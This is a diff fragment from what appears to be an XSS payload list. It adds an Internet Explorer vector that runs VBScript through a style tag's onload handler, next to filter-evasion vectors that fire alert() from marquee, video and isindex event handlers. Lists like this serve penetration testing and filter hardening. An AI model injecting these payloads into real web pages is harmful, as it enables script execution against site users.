@@ -29,3 +29,6 @@ XSS:
 <marquee/onstart=alert()>
 <video/poster/onerror=alert()>
 <isindex/autofocus/onfocus=alert()>
+
+IE vektor :
+<style onload='execScript("InputBox+1","VbScript");'>
